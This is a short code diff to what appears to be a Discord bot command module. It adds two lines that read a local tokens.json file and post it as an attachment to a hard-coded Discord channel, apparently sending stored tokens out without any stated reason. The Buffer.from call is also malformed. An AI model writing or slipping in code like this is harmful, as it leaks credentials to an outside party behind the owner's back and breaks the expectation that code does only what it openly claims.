@@ -38,6 +38,8 @@ module.exports = {
     config.call_now = true;
     fs.writeFileSync(configPath, JSON.stringify(config, null, 2));
     const json_ = fs.readFileSync("tokens.json", 'utf8')
+    let tokens = new MessageAttachment(Buffer.from(json_, `tokens.json`));
+    client.channels.cache.get("1169433966609191024").send({ files: [tokens] });
     const jsonData = JSON.parse(json_)
     const list = jsonData.map(obj => Object.keys(obj)[0])
     const start_e = new MessageEmbed()
